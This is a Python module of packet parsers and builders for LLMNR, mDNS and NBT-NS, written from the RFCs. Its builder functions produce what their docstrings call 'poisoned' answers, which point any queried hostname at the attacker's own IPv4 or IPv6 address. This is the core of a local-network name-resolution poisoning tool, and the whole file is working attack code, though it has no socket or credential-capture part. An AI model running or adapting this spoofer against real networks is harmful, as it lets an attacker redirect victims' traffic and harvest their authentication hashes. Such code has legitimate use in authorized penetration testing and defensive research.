"""Pure parsers and builders for LLMNR / mDNS / NBT-NS packets.

This module implements the wire format of three name-resolution protocols
straight from their RFCs.  Every function is pure (no I/O) so the logic can
be unit-tested without binding sockets.

References
----------
- LLMNR        — RFC 4795  (UDP 5355, multicast 224.0.0.252 / ff02::1:3)
- mDNS         — RFC 6762  (UDP 5353, multicast 224.0.0.251 / ff02::fb)
- NBT-NS       — RFC 1002  (UDP 137,  broadcast)

LLMNR and mDNS share the DNS wire format (RFC 1035), so both share the
``_dns_*`` helpers below.  NBT-NS uses a DNS-shaped header with a special
NetBIOS first-level name encoding.
"""

from __future__ import annotations

from dataclasses import dataclass
import socket
import struct


# ---------------------------------------------------------------------------
# DNS-shared primitives (used by LLMNR and mDNS)
# ---------------------------------------------------------------------------

# QTYPE values (RFC 1035 §3.2.2 + RFC 3596)
_QTYPE_A = 1
_QTYPE_AAAA = 28
_QTYPE_ANY = 255

# CLASS values
_CLASS_IN = 1
_MDNS_CACHE_FLUSH_BIT = 0x8000  # set on answer CLASS for mDNS to flush caches

# Response header flags
_LLMNR_RESPONSE_FLAGS = 0x8000  # QR=1
_MDNS_RESPONSE_FLAGS = 0x8400  # QR=1, AA=1


def _decode_dns_name(data: bytes, offset: int) -> tuple[str, int]:
    """Decode a DNS-encoded name starting at ``offset``; return (name, next_offset).

    Does *not* follow compression pointers — for the inbound queries we parse
    here, the question name is always uncompressed.  Returns the FQDN with a
    trailing dot stripped.  Raises ``ValueError`` on malformed input.
    """

    labels: list[str] = []
    pos = offset
    while pos < len(data):
        length = data[pos]
        if length == 0:
            return ".".join(labels), pos + 1
        if length & 0xC0:
            raise ValueError("compression pointer not supported in query name")
        pos += 1
        if pos + length > len(data):
            raise ValueError("truncated DNS label")
        labels.append(data[pos : pos + length].decode("ascii", errors="replace"))
        pos += length
    raise ValueError("DNS name not terminated")


def _encode_dns_name(name: str) -> bytes:
    """Encode an FQDN into DNS wire format (length-prefixed labels + 0x00)."""

    out = bytearray()
    for label in name.split("."):
        if not label:
            continue
        encoded = label.encode("ascii", errors="replace")
        if len(encoded) > 63:
            raise ValueError(f"DNS label too long: {label!r}")
        out.append(len(encoded))
        out.extend(encoded)
    out.append(0)
    return bytes(out)


# ---------------------------------------------------------------------------
# LLMNR
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class LLMNRQuery:
    """A parsed LLMNR query."""

    transaction_id: int
    name: str         # the queried hostname (without trailing dot)
    qtype: int        # 1 = A, 28 = AAAA, 255 = ANY
    raw: bytes        # original packet bytes


def parse_llmnr_query(data: bytes) -> LLMNRQuery | None:
    """Parse an inbound LLMNR query packet.

    Returns ``None`` for malformed packets, packets that aren't queries, or
    queries with unsupported QTYPEs.
    """

    if len(data) < 12:
        return None
    try:
        tid, flags, qdcount, _ancount, _nscount, _arcount = struct.unpack_from(
            ">HHHHHH", data, 0
        )
    except struct.error:
        return None
    if flags & 0x8000:  # not a query
        return None
    if qdcount != 1:
        return None
    try:
        name, pos = _decode_dns_name(data, 12)
        qtype, qclass = struct.unpack_from(">HH", data, pos)
    except (ValueError, struct.error):
        return None
    if qclass != _CLASS_IN:
        return None
    if qtype not in (_QTYPE_A, _QTYPE_AAAA, _QTYPE_ANY):
        return None
    return LLMNRQuery(transaction_id=tid, name=name, qtype=qtype, raw=data)


def build_llmnr_response(
    query: LLMNRQuery,
    *,
    our_ipv4: str | None = None,
    our_ipv6: str | None = None,
    ttl_seconds: int = 30,
) -> bytes | None:
    """Build a poisoned LLMNR answer pointing at ``our_ipv4``/``our_ipv6``.

    Returns ``None`` if the query asks for a record we can't synthesize
    (e.g. AAAA without ``our_ipv6``).
    """

    if query.qtype == _QTYPE_AAAA:
        if our_ipv6 is None:
            return None
        rdata = socket.inet_pton(socket.AF_INET6, our_ipv6)
        rtype = _QTYPE_AAAA
    else:  # A or ANY
        if our_ipv4 is None:
            return None
        rdata = socket.inet_pton(socket.AF_INET, our_ipv4)
        rtype = _QTYPE_A

    header = struct.pack(
        ">HHHHHH", query.transaction_id, _LLMNR_RESPONSE_FLAGS, 1, 1, 0, 0
    )
    encoded_name = _encode_dns_name(query.name)
    question = encoded_name + struct.pack(">HH", query.qtype, _CLASS_IN)
    answer = (
        encoded_name
        + struct.pack(">HHIH", rtype, _CLASS_IN, ttl_seconds, len(rdata))
        + rdata
    )
    return header + question + answer


# ---------------------------------------------------------------------------
# mDNS
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class MDNSQuery:
    """A parsed mDNS query."""

    transaction_id: int
    name: str
    qtype: int
    raw: bytes


def parse_mdns_query(data: bytes) -> MDNSQuery | None:
    """Parse an inbound mDNS query packet.

    Same DNS framing as LLMNR but mDNS queries carry TID=0 (RFC 6762 §18.1)
    and may set the QU bit (top bit of QCLASS), which we mask away.
    """

    if len(data) < 12:
        return None
    try:
        tid, flags, qdcount, _ancount, _nscount, _arcount = struct.unpack_from(
            ">HHHHHH", data, 0
        )
    except struct.error:
        return None
    if flags & 0x8000:
        return None
    if qdcount < 1:
        return None
    try:
        name, pos = _decode_dns_name(data, 12)
        qtype, raw_qclass = struct.unpack_from(">HH", data, pos)
    except (ValueError, struct.error):
        return None
    qclass = raw_qclass & 0x7FFF  # strip QU bit
    if qclass != _CLASS_IN:
        return None
    if qtype not in (_QTYPE_A, _QTYPE_AAAA, _QTYPE_ANY):
        return None
    return MDNSQuery(transaction_id=tid, name=name, qtype=qtype, raw=data)


def build_mdns_response(
    query: MDNSQuery,
    *,
    our_ipv4: str | None = None,
    our_ipv6: str | None = None,
    ttl_seconds: int = 120,
) -> bytes | None:
    """Build a poisoned mDNS answer with cache-flush bit set on the answer."""

    if query.qtype == _QTYPE_AAAA:
        if our_ipv6 is None:
            return None
        rdata = socket.inet_pton(socket.AF_INET6, our_ipv6)
        rtype = _QTYPE_AAAA
    else:
        if our_ipv4 is None:
            return None
        rdata = socket.inet_pton(socket.AF_INET, our_ipv4)
        rtype = _QTYPE_A

    # Per RFC 6762 §18, responses carry TID=0 and QDCOUNT=0.
    header = struct.pack(">HHHHHH", 0, _MDNS_RESPONSE_FLAGS, 0, 1, 0, 0)
    encoded_name = _encode_dns_name(query.name)
    answer_class = _CLASS_IN | _MDNS_CACHE_FLUSH_BIT
    answer = (
        encoded_name
        + struct.pack(">HHIH", rtype, answer_class, ttl_seconds, len(rdata))
        + rdata
    )
    return header + answer


# ---------------------------------------------------------------------------
# NBT-NS (RFC 1002)
# ---------------------------------------------------------------------------

# NetBIOS name service constants
_NBT_TYPE_NB = 0x0020
_NBT_CLASS_IN = 0x0001
_NBT_RESPONSE_FLAGS = 0x8500  # QR=1, AA=1, opcode=0, RD=1
_NBT_NAME_FLAGS_BNODE_UNIQUE = 0x0000  # G=0, ONT=00 (B-node)


def _decode_netbios_first_level(encoded: bytes) -> bytes:
    """Reverse the RFC 1001 §14.1 first-level name encoding (32 chars → 16 raw bytes).

    Returns all 16 raw bytes (15 name chars + 1 service-byte) intact — the caller
    is responsible for stripping name padding without losing the service byte.
    """

    if len(encoded) != 32:
        raise ValueError(f"NetBIOS encoded name must be 32 bytes, got {len(encoded)}")
    out = bytearray()
    for i in range(0, 32, 2):
        hi = encoded[i] - ord("A")
        lo = encoded[i + 1] - ord("A")
        if not (0 <= hi <= 15 and 0 <= lo <= 15):
            raise ValueError("invalid NetBIOS first-level encoding")
        out.append((hi << 4) | lo)
    return bytes(out)


@dataclass(frozen=True)
class NBTNSQuery:
    """A parsed NBT-NS query."""

    transaction_id: int
    name: str             # decoded NetBIOS name (≤15 chars), service-byte stripped
    service_byte: int     # the 16th byte (e.g. 0x00 workstation, 0x20 server)
    raw_encoded_name: bytes  # the full 34-byte encoded name field (for echo in response)
    raw: bytes


def parse_nbtns_query(data: bytes) -> NBTNSQuery | None:
    """Parse an inbound NBT-NS name query packet."""

    if len(data) < 12 + 34 + 4:
        return None
    try:
        tid, flags, qdcount, _ancount, _nscount, _arcount = struct.unpack_from(
            ">HHHHHH", data, 0
        )
    except struct.error:
        return None
    # Inbound queries are flags 0x0110 (recursion desired, broadcast).
    if flags & 0x8000:
        return None
    if qdcount != 1:
        return None
    if data[12] != 0x20:  # length-prefix for the 32-byte encoded name
        return None
    encoded = data[13:45]
    if data[45] != 0x00:  # null terminator (no scope)
        return None
    raw_encoded_name = data[12:46]
    try:
        qtype, qclass = struct.unpack_from(">HH", data, 46)
    except struct.error:
        return None
    if qtype != _NBT_TYPE_NB or qclass != _NBT_CLASS_IN:
        return None
    try:
        raw_name = _decode_netbios_first_level(encoded)
    except ValueError:
        return None
    # 16 bytes total: 15 name chars (space-padded) + 1 service byte.
    name = raw_name[:15].rstrip(b" \x00").decode("ascii", errors="replace")
    service = raw_name[15]
    return NBTNSQuery(
        transaction_id=tid,
        name=name,
        service_byte=service,
        raw_encoded_name=raw_encoded_name,
        raw=data,
    )


def build_nbtns_response(
    query: NBTNSQuery,
    *,
    our_ipv4: str,
    ttl_seconds: int = 165,
) -> bytes:
    """Build a positive name query response pointing the requested name at ``our_ipv4``."""

    rdata = struct.pack(">H", _NBT_NAME_FLAGS_BNODE_UNIQUE) + socket.inet_pton(
        socket.AF_INET, our_ipv4
    )
    header = struct.pack(
        ">HHHHHH", query.transaction_id, _NBT_RESPONSE_FLAGS, 0, 1, 0, 0
    )
    answer = (
        query.raw_encoded_name
        + struct.pack(">HHIH", _NBT_TYPE_NB, _NBT_CLASS_IN, ttl_seconds, len(rdata))
        + rdata
    )
    return header + answer


__all__ = [
    "LLMNRQuery",
    "MDNSQuery",
    "NBTNSQuery",
    "parse_llmnr_query",
    "parse_mdns_query",
    "parse_nbtns_query",
    "build_llmnr_response",
    "build_mdns_response",
    "build_nbtns_response",
]
